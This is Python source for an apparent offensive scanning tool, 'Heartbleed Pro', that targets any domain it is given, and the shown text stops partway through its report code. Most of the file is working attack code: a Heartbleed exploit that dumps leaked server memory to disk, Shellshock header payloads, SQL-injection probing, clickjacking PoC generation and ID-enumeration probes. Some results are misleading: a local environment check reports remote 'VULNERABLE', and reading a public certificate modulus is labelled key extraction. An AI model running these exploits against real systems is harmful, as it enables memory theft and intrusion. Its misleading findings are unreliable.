#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ========================================================================
#  Tool       : Heartbleed Pro v1.0 - Full Recon + Vulnerability Assessment + Business Logic
#  Author     : SYLHETYHACKVENGER (THE-ERROR808) & ek0ms
#  Description: All‑in‑One Reconnaissance + Vulnerability Assessment + Business Logic Scanner
#  Usage      : python3 heartbleed_pro.py <domain>
# ========================================================================

import sys
import os
import socket
import struct
import time
import select
import re
import base64
import threading
import queue
import subprocess
from urllib.request import urlopen, Request
from urllib.error import URLError
from datetime import datetime
import random
import requests
import dns.resolver
import whois
import json
from urllib.parse import urlparse, urljoin, parse_qs, urlencode
from bs4 import BeautifulSoup
import concurrent.futures
import urllib3
import uuid
import html
import string
from collections import deque, defaultdict
import xml.etree.ElementTree as ET

# Suppress SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ─── Color Palette ──────────────────────────────────────────────────────────
class Colors:
    CYAN = '\033[96m'
    MAGENTA = '\033[95m'
    YELLOW = '\033[93m'
    GREEN = '\033[92m'
    RED = '\033[91m'
    BLUE = '\033[94m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    ENDC = '\033[0m'
    BG_BLACK = '\033[40m'
    BG_RED = '\033[41m'
    BG_GREEN = '\033[42m'
    BG_YELLOW = '\033[43m'
    BG_BLUE = '\033[44m'
    BG_MAGENTA = '\033[45m'
    BG_CYAN = '\033[46m'
    BG_WHITE = '\033[47m'
    BLINK = '\033[5m'
    DIM = '\033[2m'

# ─── RECONNAISSANCE CLASS ──────────────────────────────────────────────────
class Reconnaissance:
    """Comprehensive reconnaissance scanning"""
    
    @staticmethod
    def get_title(url):
        """Get page title"""
        try:
            response = requests.get(url, timeout=10, verify=False)
            soup = BeautifulSoup(response.text, 'html.parser')
            title = soup.title.string if soup.title else 'N/A'
            return title.strip()
        except:
            return 'N/A'
    
    @staticmethod
    def get_ip(domain):
        """Get IP address"""
        try:
            return socket.gethostbyname(domain)
        except:
            return 'N/A'
    
    @staticmethod
    def get_server(url):
        """Get web server info"""
        try:
            response = requests.get(url, timeout=10, verify=False)
            return response.headers.get('Server', 'N/A')
        except:
            return 'N/A'
    
    @staticmethod
    def detect_cms(url):
        """Detect CMS"""
        try:
            response = requests.get(url, timeout=10, verify=False)
            content = response.text
            
            if 'wp-content' in content or 'wp-includes' in content:
                return 'WordPress'
            elif 'Joomla' in content:
                return 'Joomla'
            elif 'Drupal' in content:
                return 'Drupal'
            elif 'Magento' in content or '/skin/frontend/' in content:
                return 'Magento'
            else:
                return 'Could Not Detect'
        except:
            return 'Could Not Detect'
    
    @staticmethod
    def cloudflare_detect(domain):
        """Detect Cloudflare"""
        try:
            response = requests.get(f'http://api.hackertarget.com/httpheaders/?q={domain}', timeout=10)
            return 'Detected' if 'cloudflare' in response.text.lower() else 'Not Detected'
        except:
            return 'Error Checking'
    
    @staticmethod
    def robots_check(url):
        """Check robots.txt"""
        try:
            response = requests.get(f'{url}/robots.txt', timeout=10, verify=False)
            if response.status_code == 200:
                content = response.text
                if content.strip():
                    return f'Found\n{content[:500]}...' if len(content) > 500 else f'Found\n{content}'
                return 'Found But Empty'
            return 'Not Found'
        except:
            return 'Error Checking'
    
    @staticmethod
    def whois_lookup(domain):
        """Perform WHOIS lookup"""
        try:
            w = whois.whois(domain)
            return w.text if hasattr(w, 'text') else str(w)[:500]
        except:
            return 'Error performing WHOIS lookup'
    
    @staticmethod
    def geo_ip(domain):
        """Get Geo-IP information"""
        try:
            response = requests.get(f'http://api.hackertarget.com/geoip/?q={domain}', timeout=10)
            return response.text
        except:
            return 'Error getting Geo-IP data'
    
    @staticmethod
    def get_headers(url):
        """Get HTTP headers"""
        try:
            response = requests.get(url, timeout=10, verify=False)
            headers = []
            for key, value in response.headers.items():
                headers.append(f'{key}: {value}')
            return '\n'.join(headers)
        except:
            return 'Error getting headers'
    
    @staticmethod
    def dns_lookup(domain):
        """Perform DNS lookup"""
        try:
            response = requests.get(f'http://api.hackertarget.com/dnslookup/?q={domain}', timeout=10)
            return response.text
        except:
            return 'Error performing DNS lookup'
    
    @staticmethod
    def subnet_calc(domain):
        """Calculate subnet information"""
        try:
            response = requests.get(f'http://api.hackertarget.com/subnetcalc/?q={domain}', timeout=10)
            return response.text
        except:
            return 'Error calculating subnet'
    
    @staticmethod
    def nmap_scan(domain):
        """Perform port scan"""
        try:
            response = requests.get(f'http://api.hackertarget.com/nmap/?q={domain}', timeout=15)
            return response.text
        except:
            return 'Error performing port scan'
    
    @staticmethod
    def subdomain_scan(domain):
        """Find subdomains"""
        try:
            response = requests.get(f'http://api.hackertarget.com/hostsearch/?q={domain}', timeout=15)
            lines = response.text.strip().split('\n')
            subdomains = []
            for line in lines[1:]:  # Skip header
                parts = line.split(',')
                if len(parts) >= 2:
                    subdomains.append({'domain': parts[0], 'ip': parts[1]})
            return subdomains
        except:
            return []
    
    @staticmethod
    def reverse_ip(ip):
        """Reverse IP lookup"""
        try:
            response = requests.post('http://domains.yougetsignal.com/domains.php', 
                                    data={'remoteAddress': ip, 'ket': ''}, timeout=15)
            # Clean up the response
            data = response.text.replace('[', '').replace(']', '').replace('"', '')
            data = data.replace('{', '').replace('}', '').replace(':', ',')
            sites = [s.strip() for s in data.split(',') if s.strip() and not s.startswith('domain')]
            return sites
        except:
            return []
    
    @staticmethod
    def sql_injection_scan(url):
        """Scan for SQL injection vulnerabilities"""
        try:
            response = requests.get(url, timeout=10, verify=False)
            soup = BeautifulSoup(response.text, 'html.parser')
            links = soup.find_all('a', href=True)
            
            vulnerable = []
            sql_errors = ['mysql', 'sql', 'error', 'warning', 'you have an error', 'syntax error']
            
            for link in links:
                href = link['href']
                if '?' in href:
                    if '://' in href:
                        test_url = href + "'"
                    else:
                        test_url = url.rstrip('/') + '/' + href.lstrip('/') + "'"
                    
                    try:
                        test_response = requests.get(test_url, timeout=5, verify=False)
                        is_vuln = False
                        for error in sql_errors:
                            if error.lower() in test_response.text.lower():
                                is_vuln = True
                                break
                        vulnerable.append({'url': href, 'vulnerable': is_vuln})
                    except:
                        vulnerable.append({'url': href, 'vulnerable': False})
            
            return vulnerable
        except:
            return []
    
    @staticmethod
    def alexa_rank(domain):
        """Get Alexa rank"""
        try:
            response = requests.get(f'http://data.alexa.com/data?cli=10&url={domain}', timeout=10)
            soup = BeautifulSoup(response.text, 'xml')
            popularity = soup.find('POPULARITY')
            if popularity:
                return popularity.get('TEXT', 'N/A')
            return 'N/A'
        except:
            return 'N/A'
    
    @staticmethod
    def social_links(url):
        """Extract social media links"""
        try:
            response = requests.get(url, timeout=10, verify=False)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            social_patterns = {
                'Facebook': 'facebook.com/',
                'Twitter': 'twitter.com/',
                'Instagram': 'instagram.com/',
                'YouTube': 'youtube.com/',
                'LinkedIn': 'linkedin.com/',
                'GitHub': 'github.com/',
                'Pinterest': 'pinterest.com/'
            }
            
            found_links = {}
            for link in soup.find_all('a', href=True):
                href = link['href']
                for platform, pattern in social_patterns.items():
                    if pattern in href:
                        if platform not in found_links:
                            found_links[platform] = []
                        if href not in found_links[platform]:
                            found_links[platform].append(href)
            
            return found_links
        except:
            return {}
    
    @staticmethod
    def mx_lookup(domain):
        """Perform MX lookup"""
        try:
            mx_records = dns.resolver.resolve(domain, 'MX')
            results = []
            for mx in mx_records:
                mx_domain = str(mx.exchange).rstrip('.')
                try:
                    mx_ip = socket.gethostbyname(mx_domain)
                    results.append({'domain': mx_domain, 'ip': mx_ip, 'preference': mx.preference})
                except:
                    results.append({'domain': mx_domain, 'ip': 'N/A', 'preference': mx.preference})
            return results
        except:
            return []
    
    @staticmethod
    def count_links(url):
        """Count total links on page"""
        try:
            response = requests.get(url, timeout=10, verify=False)
            soup = BeautifulSoup(response.text, 'html.parser')
            return len(soup.find_all('a', href=True))
        except:
            return 0
    
    @staticmethod
    def print_header(text):
        """Print section header - FIXED"""
        print(f'\n{Colors.BOLD}{Colors.YELLOW}{"═" * 60}')
        print(f'{Colors.BOLD}{Colors.YELLOW}  {text}')
        print(f'{Colors.BOLD}{Colors.YELLOW}{"═" * 60}{Colors.ENDC}')
    
    @staticmethod
    def print_result(label, value):
        """Print formatted result"""
        print(f'{Colors.BOLD}{Colors.CYAN}[{label}]{Colors.ENDC} {Colors.GREEN}{value}{Colors.ENDC}')

# ─── LOADING ANIMATION ──────────────────────────────────────────────────
def loading_animation(stop_event):
    chars = ['█', '▓', '▒', '░']
    while not stop_event.is_set():
        for char in chars:
            sys.stdout.write(f'\r{Colors.CYAN}  [ {char} ] {Colors.YELLOW}Scanning...{Colors.ENDC}')
            sys.stdout.flush()
            time.sleep(0.1)

# ─── CLICKJACKING MODULE ──────────────────────────────────────────────────
class ClickjackingAttack:
    """Test for Clickjacking (X-Frame-Options header missing)"""

    @staticmethod
    def attack(target, result_queue):
        time.sleep(random.uniform(0.5, 1.5))
        try:
            url = f"http://{target}"
            req = Request(url, headers={'User-Agent': 'HeartbleedPro/1.0'})
            response = urlopen(req, timeout=10)
            headers = response.info()

            if "X-Frame-Options" not in headers:
                poc = f"""<!DOCTYPE html>
<html>
<head><title>Clickjacking POC</title></head>
<body style="background:#0a0a0a;color:#00ff00;font-family:'Courier New',monospace;">
    <div style="border:2px solid #ff00ff;padding:20px;margin:20px;">
        <h1 style="color:#ff00ff;">VULNERABLE TO CLICKJACKING</h1>
        <p>Target: <span style="color:#00ffff;">{target}</span></p>
        <iframe src="{url}" width="800" height="600" style="border:3px solid #ff0000;"></iframe>
        <p style="color:#ffaa00;">[!] This page demonstrates Clickjacking vulnerability</p>
        <p style="color:#00ff00;">[+] Attack vector: X-Frame-Options header missing</p>
    </div>
</body>
</html>"""
                with open(f"clickjack_{target}.html", "w") as f:
                    f.write(poc)
                result_queue.put(("clickjacking", "VULNERABLE", f"POC saved to clickjack_{target}.html"))
            else:
                result_queue.put(("clickjacking", "SECURE", "X-Frame-Options header present"))
        except Exception as e:
            result_queue.put(("clickjacking", "ERROR", str(e)))

# ─── HEARTBLEED MODULE ──────────────────────────────────────────────────
class HeartbleedAttack:
    """Test for Heartbleed (CVE-2014-0160)"""

    TLS_VERSIONS = {0x01: 'TLSv1.0', 0x02: 'TLSv1.1', 0x03: 'TLSv1.2'}

    @staticmethod
    def build_client_hello(tls_ver):
        client_hello = [
            0x16, 0x03, tls_ver, 0x00, 0xdc,
            0x01, 0x00, 0x00, 0xd8, 0x03, tls_ver,
            0x53, 0x43, 0x5b, 0x90, 0x9d, 0x9b, 0x72, 0x0b,
            0xbc, 0x0c, 0xbc, 0x2b, 0x92, 0xa8, 0x48, 0x97,
            0xcf, 0xbd, 0x39, 0x04, 0xcc, 0x16, 0x0a, 0x85,
            0x03, 0x90, 0x9f, 0x77, 0x04, 0x33, 0xd4, 0xde,
            0x00, 0x00, 0x66,
            0xc0, 0x14, 0xc0, 0x0a, 0xc0, 0x22, 0xc0, 0x21,
            0x00, 0x39, 0x00, 0x38, 0x00, 0x88, 0x00, 0x87,
            0xc0, 0x0f, 0xc0, 0x05, 0x00, 0x35, 0x00, 0x84,
            0xc0, 0x12, 0xc0, 0x08, 0xc0, 0x1c, 0xc0, 0x1b,
            0x00, 0x16, 0x00, 0x13, 0xc0, 0x0d, 0xc0, 0x03,
            0x00, 0x0a, 0xc0, 0x13, 0xc0, 0x09, 0xc0, 0x1f,
            0xc0, 0x1e, 0x00, 0x33, 0x00, 0x32, 0x00, 0x9a,
            0x00, 0x99, 0x00, 0x45, 0x00, 0x44, 0xc0, 0x0e,
            0xc0, 0x04, 0x00, 0x2f, 0x00, 0x96, 0x00, 0x41,
            0xc0, 0x11, 0xc0, 0x07, 0xc0, 0x0c, 0xc0, 0x02,
            0x00, 0x05, 0x00, 0x04, 0x00, 0x15, 0x00, 0x12,
            0x00, 0x09, 0x00, 0x14, 0x00, 0x11, 0x00, 0x08,
            0x00, 0x06, 0x00, 0x03, 0x00, 0xff,
            0x01, 0x00,
            0x00, 0x49,
            0x00, 0x0b, 0x00, 0x04, 0x03, 0x00, 0x01, 0x02,
            0x00, 0x0a, 0x00, 0x34, 0x00, 0x32, 0x00, 0x0e,
            0x00, 0x0d, 0x00, 0x19, 0x00, 0x0b, 0x00, 0x0c,
            0x00, 0x18, 0x00, 0x09, 0x00, 0x0a, 0x00, 0x16,
            0x00, 0x17, 0x00, 0x08, 0x00, 0x06, 0x00, 0x07,
            0x00, 0x14, 0x00, 0x15, 0x00, 0x04, 0x00, 0x05,
            0x00, 0x12, 0x00, 0x13, 0x00, 0x01, 0x00, 0x02,
            0x00, 0x03, 0x00, 0x0f, 0x00, 0x10, 0x00, 0x11,
            0x00, 0x23, 0x00, 0x00,
            0x00, 0x0f, 0x00, 0x01, 0x01
        ]
        return bytes(client_hello)

    @staticmethod
    def build_heartbeat(tls_ver, payload_len=0x4000):
        heartbeat = [
            0x18, 0x03, tls_ver, 0x00, 0x29,
            0x01, payload_len >> 8, payload_len & 0xff,
            0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
            0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41
        ]
        heartbeat.extend([0x41] * 16)
        return bytes(heartbeat)

    @staticmethod
    def recv_tls_record(sock):
        try:
            header = sock.recv(5)
            if not header:
                return None, None, None
            typ, ver, length = struct.unpack('>BHH', header)
            data = b''
            while len(data) < length:
                chunk = sock.recv(length - len(data))
                if not chunk:
                    break
                data += chunk
            return typ, ver, data
        except:
            return None, None, None

    @staticmethod
    def hexdump(data, max_len=1024):
        result = ""
        data = data[:max_len]
        for i in range(0, len(data), 16):
            chunk = data[i:i+16]
            hex_part = ' '.join(f'{b:02X}' for b in chunk)
            ascii_part = ''.join(chr(b) if 32 <= b <= 126 else '.' for b in chunk)
            result += f'  {i:04x}: {hex_part:<48} {ascii_part}\n'
        return result

    @staticmethod
    def attack(target, result_queue, port=443, payload_len=0x4000):
        time.sleep(random.uniform(0.5, 1.5))

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((target, port))

            supported = False
            for ver in HeartbleedAttack.TLS_VERSIONS.keys():
                sock.send(HeartbleedAttack.build_client_hello(ver))
                while True:
                    typ, ver_recv, msg = HeartbleedAttack.recv_tls_record(sock)
                    if typ is None:
                        break
                    if typ == 22 and msg and msg[0] == 0x0E:
                        supported = True
                        break
                if supported:
                    break

            if not supported:
                result_queue.put(("heartbleed", "ERROR", "No TLS version supported"))
                sock.close()
                return

            sock.send(HeartbleedAttack.build_heartbeat(ver, payload_len))

            while True:
                typ, ver_recv, msg = HeartbleedAttack.recv_tls_record(sock)
                if typ is None:
                    break
                if typ == 24:
                    if len(msg) > 0x29:
                        result_queue.put(("heartbleed", "VULNERABLE", f"Leaked {len(msg)} bytes"))
                        with open(f"heartbleed_dump_{target}.bin", "wb") as f:
                            f.write(msg)
                        result_queue.put(("heartbleed", "DUMP_SAVED", f"Memory dump saved to heartbleed_dump_{target}.bin"))
                        leaked = HeartbleedAttack.hexdump(msg)
                        result_queue.put(("heartbleed", "LEAKED_DATA", leaked))
                        
                        try:
                            output = subprocess.check_output(
                                f"echo | openssl s_client -connect {target}:{port} -showcerts 2>/dev/null | openssl x509 -modulus -noout | cut -d= -f2",
                                shell=True, timeout=10
                            ).decode().strip()
                            if output and len(output) > 10:
                                result_queue.put(("heartbleed", "KEY_EXTRACTED", f"RSA modulus extracted: {output[:32]}..."))
                        except:
                            pass
                        sock.close()
                        return
                    break
                if typ == 21:
                    result_queue.put(("heartbleed", "SECURE", "Server returned error alert"))
                    break

            sock.close()
            result_queue.put(("heartbleed", "SECURE", "No Heartbleed vulnerability detected"))

        except Exception as e:
            result_queue.put(("heartbleed", "ERROR", str(e)))

# ─── SHELLSHOCK MODULE ──────────────────────────────────────────────────
class ShellshockAttack:
    """Test for Shellshock (CVE-2014-6271)"""

    @staticmethod
    def attack(target, result_queue, port=80, ssl=False):
        time.sleep(random.uniform(0.5, 1.5))

        protocol = "https" if ssl else "http"

        vectors = [
            ("User-Agent", "() { :;}; echo; echo; /bin/bash -c 'echo SHELLSHOCK_VULNERABLE'"),
            ("Cookie", "() { :;}; echo; echo; /bin/bash -c 'echo SHELLSHOCK_VULNERABLE'"),
            ("Referer", "() { :;}; echo; echo; /bin/bash -c 'echo SHELLSHOCK_VULNERABLE'"),
            ("X-Forwarded-For", "() { :;}; echo; echo; /bin/bash -c 'echo SHELLSHOCK_VULNERABLE'")
        ]

        vulnerable = False
        vector_used = ""

        for header_name, header_value in vectors:
            try:
                req = Request(f"{protocol}://{target}:{port}/", headers={header_name: header_value})
                response = urlopen(req, timeout=10)
                data = response.read().decode('utf-8', errors='ignore')

                if "SHELLSHOCK_VULNERABLE" in data:
                    vulnerable = True
                    vector_used = header_name
                    break
            except:
                pass

        if vulnerable:
            result_queue.put(("shellshock", "VULNERABLE", f"Vector: {vector_used} - Remote code execution possible"))
        else:
            result_queue.put(("shellshock", "SECURE", "No Shellshock vectors succeeded"))

# ─── BASH VARIABLE MODULE ──────────────────────────────────────────────
class BashVariableAttack:
    """Scan for dangerous Bash environment variables"""

    @staticmethod
    def attack(target, result_queue):
        time.sleep(random.uniform(0.5, 1.5))

        dangerous_vars = [
            "BASH_ENV", "SHELL", "BASHOPTS", "BASH_XTRACEFD",
            "LD_LIBRARY_PATH", "LD_PRELOAD", "PATH", "IFS",
            "HOME", "HISTFILE", "HISTSIZE", "LANG", "LC_ALL",
            "OLDPWD", "PWD", "SHELLOPTS", "TERM"
        ]

        found_local = []
        for var in dangerous_vars:
            if var in os.environ:
                found_local.append(f"{var}={os.environ[var][:50]}")

        if found_local:
            result_queue.put(("bashvars", "VULNERABLE", f"{len(found_local)} dangerous vars found locally"))
        else:
            result_queue.put(("bashvars", "SECURE", "No dangerous bash variables found"))

# ─── BUSINESS LOGIC SCANNER ──────────────────────────────────────────────
class BizLogicScanner:
    """Business Logic Heuristic Scanner with Exploitation"""
    
    def __init__(self, base_url):
        self.base_url = base_url.rstrip("/")
        self.parsed_base = urlparse(self.base_url)
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "BizLogicScanner/1.2 (+https://github.com/ekomsSavior)",
        })
        self.rate_limit = 0.5
        self.visited = set()
        self.pages = {}
        self.forms = defaultdict(list)
        self.findings = []
        self.exploitation_results = []
        self.start_time = datetime.now()
        self.authenticated = False
        self.discovery = {"robots": None, "sitemaps": [], "openapi": None, "openapi_paths": []}
        self.reports_dir = "reports"
        self.scan_dir = None
        self.report_file = None
        self.report_json = None
        self.report_html = None
        
    def _sleep(self):
        time.sleep(self.rate_limit)
        
    def safe_get(self, url, **kwargs):
        self._sleep()
        try:
            r = self.session.get(url, timeout=10, allow_redirects=True, **kwargs)
            return r
        except Exception:
            return None
            
    def safe_post(self, url, data=None, json=None, **kwargs):
        self._sleep()
        try:
            r = self.session.post(url, data=data, json=json, timeout=10, allow_redirects=True, **kwargs)
            return r
        except Exception:
            return None
            
    def crawl(self, start_path="/", max_pages=50):
        q = deque()
        root = urljoin(self.base_url, start_path)
        q.append(root)
        while q and len(self.pages) < max_pages:
            url = q.popleft()
            if url in self.visited:
                continue
            parsed = urlparse(url)
            if parsed.netloc != self.parsed_base.netloc:
                continue
            r = self.safe_get(url)
            self.visited.add(url)
            if not r:
                continue
            self.pages[url] = (r.status_code, r.text)
            soup = BeautifulSoup(r.text, "html.parser")
            for a in soup.find_all("a", href=True):
                href = a.get("href")
                joined = urljoin(url, href)
                if joined not in self.visited and urlparse(joined).scheme in ("http", "https"):
                    q.append(joined)
            for form in soup.find_all("form"):
                form_info = self.parse_form(form, url)
                self.forms[url].append(form_info)
                
    def parse_form(self, soup_form, page_url):
        method = (soup_form.get("method") or "get").lower()
        action = soup_form.get("action") or page_url
        form_id = soup_form.get("id") or soup_form.get("name") or None
        classes = " ".join(soup_form.get("class") or []) or None
        inputs = []
        for inp in soup_form.find_all(["input", "textarea", "select"]):
            name = inp.get("name")
            itype = inp.get("type", inp.name)
            value = inp.get("value", "")
            inputs.append({"name": name, "type": itype, "value": value})
        raw = str(soup_form)[:2000]
        return {"method": method, "action": urljoin(page_url, action), "inputs": inputs,
                "raw": raw, "id": form_id, "classes": classes}
                
    def record_finding(self, f):
        fid = f.get("id") or str(uuid.uuid4())
        f_out = {
            "id": fid,
            "url": f.get("url"),
            "type": f.get("type"),
            "title": f.get("title") or f.get("type"),
            "severity": f.get("severity", "Medium"),
            "confidence": f.get("confidence", "Low"),
            "http_status": f.get("http_status"),
            "headers": f.get("headers"),
            "parameter": f.get("parameter"),
            "form_id": f.get("form_id"),
            "snippet": (f.get("snippet", "")[:400] + "...") if f.get("snippet") and len(f.get("snippet", "")) > 400 else f.get("snippet", ""),
            "evidence": (f.get("evidence", "")[:800] + "...") if f.get("evidence") and len(f.get("evidence", "")) > 800 else f.get("evidence", ""),
            "remediation": f.get("remediation"),
            "safe_poc": f.get("safe_poc"),
        }
        self.findings.append(f_out)
        return f_out
        
    def run_checks(self):
        """Run all business logic checks"""
        print(f'\n{Colors.BOLD}{Colors.MAGENTA}{"═" * 60}')
        print(f'{Colors.BOLD}{Colors.MAGENTA}  BUSINESS LOGIC SCANNER - Running Heuristic Checks')
        print(f'{Colors.BOLD}{Colors.MAGENTA}{"═" * 60}{Colors.ENDC}')
        
        # Check for unverified ownership
        self.check_unverified_ownership()
        
        # Check for authentication bypass
        self.check_authentication_bypass()
        
        # Check for authorization bypass
        self.check_authorization_bypass()
        
        # Check for weak password recovery
        self.check_weak_password_recovery()
        
        # Check for incorrect ownership assignment
        self.check_incorrect_ownership_assignment()
        
        # Check for allocation without limits
        self.check_allocation_without_limits()
        
        # Check for premature release
        self.check_premature_release()
        
        # Check for single unique action enforcement
        self.check_single_unique_action()
        
        # Check for behavioral workflow enforcement
        self.check_behavioral_workflow()
        
        print(f"\n{Colors.GREEN}[+] Business logic checks complete. {len(self.findings)} findings detected.{Colors.ENDC}")
        
    def check_unverified_ownership(self):
        keywords = ["claim", "become-owner", "register-organization", "transfer-ownership", "verify-ownership", "claim ownership"]
        for url, (status, text) in list(self.pages.items()):
            if not text:
                continue
            lower = text.lower()
            for k in keywords:
                if k in lower:
                    m = re.search(re.escape(k), lower)
                    snippet = self._snippet_of(text, m) if m else text[:200]
                    self.record_finding({
                        "url": url,
                        "type": "unverified_ownership_keyword",
                        "title": "Ownership claim wording found",
                        "severity": "High",
                        "confidence": "Medium",
                        "http_status": status,
                        "snippet": snippet,
                        "evidence": f"Found keyword '{k}' on page.",
                        "remediation": "Require out-of-band verification (DNS TXT, file-based token, domain-validated email).",
                        "safe_poc": f"Manually review the page at {url}; check if the 'claim' action leads to a form that accepts only a name/email."
                    })
                    
    def check_authentication_bypass(self):
        for url in list(self.pages.keys()):
            parsed = urlparse(url)
            qs = parse_qs(parsed.query)
            if any(k.lower().startswith("token") or k.lower().endswith("_token") for k in qs.keys()):
                self.record_finding({
                    "url": url,
                    "type": "token_in_url",
                    "title": "Authentication token found in URL/query string",
                    "severity": "High",
                    "confidence": "High",
                    "http_status": self.pages.get(url, (None, ""))[0],
                    "parameter": ", ".join(qs.keys()),
                    "snippet": parsed.query[:300],
                    "evidence": f"Query parameters include token-like keys: {list(qs.keys())}",
                    "remediation": "Do not accept authentication or authorization tokens via GET parameters; use Authorization headers or secure, short-lived cookies.",
                    "safe_poc": f"Manually try removing the token query parameter from the URL and observe whether the resource still returns 200."
                })
                
    def check_authorization_bypass(self):
        id_like = re.compile(r"/(user|account|invoice|order)s?/?(\d{3,9})(/|$)", re.I)
        for url in list(self.pages.keys()):
            m = id_like.search(url)
            if m:
                original_id = m.group(2)
                try:
                    alt_id = str(int(original_id) + 1)
                except Exception:
                    alt_id = None
                if alt_id:
                    alt_url = url.replace(original_id, alt_id)
                    h = self.safe_get(alt_url)
                    hstatus = h.status_code if h else None
                    if hstatus == 200:
                        self.record_finding({
                            "url": url,
                            "type": "insecure_id_enumeration",
                            "title": "Predictable numeric ID may allow enumeration",
                            "severity": "High",
                            "confidence": "Medium",
                            "http_status": hstatus,
                            "parameter": original_id,
                            "snippet": f"Original: {url[:100]} | Probe: {alt_url[:100]} returned {hstatus}",
                            "evidence": f"GET request to {alt_url} returned {hstatus}, suggesting predictable IDs.",
                            "remediation": "Use unguessable identifiers (UUIDs) or enforce server-side access checks for every resource.",
                            "safe_poc": f"Manually verify the behavior for adjacent IDs with a browser or curl."
                        })
                        
    def check_weak_password_recovery(self):
        for page, forms in self.forms.items():
            for f in forms:
                action = f["action"]
                if re.search(r"forgot|reset.*password|password_reset|recover", action, re.I) or re.search(r"forgot|reset password", f.get("raw",""), re.I):
                    inputs = [i["name"] for i in f["inputs"] if i.get("name")]
                    if any(re.search(r"(security_question|mother_maiden|birthplace|pet_name)", name, re.I) for name in inputs):
                        self.record_finding({
                            "url": page,
                            "type": "weak_secret_questions",
                            "title": "Password recovery uses static knowledge-based questions",
                            "severity": "High",
                            "confidence": "Medium",
                            "form_id": f.get("id"),
                            "parameter": ", ".join(inputs),
                            "snippet": f.get("raw", "")[:400],
                            "evidence": f"Password recovery form requests static secret questions: {inputs}",
                            "remediation": "Avoid KBAs; prefer short single-use tokens via email/SMS and MFA.",
                            "safe_poc": f"Manually exercise the forgot-password flow for a test account and observe required verification steps."
                        })
                        
    def check_incorrect_ownership_assignment(self):
        for page, fs in self.forms.items():
            for f in fs:
                if re.search(r"owner|assign|transfer", f["raw"], re.I) or re.search(r"owner", " ".join(i.get("name","") or "" for i in f["inputs"]), re.I):
                    self.record_finding({
                        "url": page,
                        "type": "ownership_assignment_form",
                        "title": "Form that may allow ownership change",
                        "severity": "High",
                        "confidence": "Medium",
                        "form_id": f.get("id"),
                        "parameter": ", ".join([i.get("name") or "<unnamed>" for i in f["inputs"]]),
                        "snippet": f.get("raw", "")[:400],
                        "evidence": f"Form may allow ownership change: action {f['action']}",
                        "remediation": "Ownership changes must require multi-factor verification and admin approval with audit trail.",
                        "safe_poc": "Manually review the flow for ownership changes and verify verification steps required."
                    })
                    
    def check_allocation_without_limits(self):
        for url, (status, text) in self.pages.items():
            if re.search(r"/(create|new|upload|provision|allocate)", url, re.I) or re.search(r"\b(create|upload|provision)\b", text, re.I):
                r = self.safe_get(url)
                rate_headers = []
                if r:
                    for h in ("x-ratelimit-limit", "x-rate-limit", "x-ratelimit-remaining", "retry-after"):
                        if h in r.headers:
                            rate_headers.append({h: r.headers.get(h)})
                if not rate_headers:
                    self.record_finding({
                        "url": url,
                        "type": "resource_allocation_no_rate_limit",
                        "title": "Create/upload-like endpoint with no rate-limit headers observed",
                        "severity": "Medium",
                        "confidence": "Low",
                        "http_status": r.status_code if r else status,
                        "snippet": text[:400],
                        "evidence": "Create-like endpoint found with no obvious rate-limit headers.",
                        "remediation": "Implement per-account quotas, rate-limiting headers, and throttles server-side.",
                        "safe_poc": "Attempt a manual small-scale create (one or two attempts) with a test account."
                    })
                    
    def check_premature_release(self):
        for url, (status, text) in self.pages.items():
            if re.search(r"(pending|processing).{0,40}(available|download|access)", text, re.I):
                m = re.search(r"(pending|processing).{0,40}(available|download|access)", text, re.I)
                self.record_finding({
                    "url": url,
                    "type": "premature_release_text",
                    "title": "Resource may be shown as available while pending/processing",
                    "severity": "High",
                    "confidence": "Medium",
                    "http_status": status,
                    "snippet": self._snippet_of(text, m) if m else text[:300],
                    "evidence": "Page mentions resource is available/accessible while status is pending or processing.",
                    "remediation": "Enforce finalization server-side before allowing downloads/access.",
                    "safe_poc": "Manually attempt an authorized download only for test resources."
                })
                
    def check_single_unique_action(self):
        token_pattern = re.compile(r"(?:token|code|invite)[=:\s]*[A-Za-z0-9_\-]{6,}", re.I)
        for url, (status, text) in self.pages.items():
            m = token_pattern.search(text)
            if m:
                self.record_finding({
                    "url": url,
                    "type": "potential_token_exposure",
                    "title": "Token-like string present on page",
                    "severity": "High",
                    "confidence": "Medium",
                    "http_status": status,
                    "snippet": self._snippet_of(text, m),
                    "evidence": "Found token-like string that may be single-use token embedded in content.",
                    "remediation": "Ensure tokens are single-use and not embedded in pages; clear them from UI/logs.",
                    "safe_poc": "Open the page and search for the string; do not attempt to reuse tokens programmatically."
                })
                
    def check_behavioral_workflow(self):
        for url, (status, text) in self.pages.items():
            if re.search(r"if\s*\(!.*approved|document\.getElementById\(.+disabled|return false;.*submit", text, re.I):
                self.record_finding({
                    "url": url,
                    "type": "client_side_workflow_enforcement",
                    "title": "Workflow enforcement appears client-side",
                    "severity": "Medium",
                    "confidence": "Medium",
                    "http_status": status,
                    "snippet": text[:400],
                    "evidence": "JS patterns indicate workflow enforcement may be client-side only.",
                    "remediation": "Enforce workflow constraints on server-side and validate state transitions.",
                    "safe_poc": "Open devtools and check whether disabling client-side JS still allows actions."
                })
                
    def _snippet_of(self, text, match, ctx=80):
        if not text:
            return ""
        try:
            if isinstance(match, re.Match):
                s = match.start()
                e = match.end()
            else:
                idx = text.lower().find(str(match).lower())
                if idx == -1:
                    return ""
                s = idx
                e = idx + len(str(match))
            start = max(0, s - ctx)
            end = min(len(text), e + ctx)
            return text[start:end].replace("\n", " ").strip()
        except Exception:
            return ""
            
    def generate_report(self):
        """Generate comprehensive report"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        domain = urlparse(self.base_url).netloc.replace(':', '_').replace('/', '_')
        self.scan_dir = os.path.join(self.reports_dir, f"bizlogic_{domain}_{timestamp}")
        
        if not os.path.exists(self.scan_dir):
            os.makedirs(self.scan_dir)
            
        self.report_file = os.path.join(self.scan_dir, "bizlogic_report.txt")
        self.report_json = os.path.join(self.scan_dir, "bizlogic_report.json")
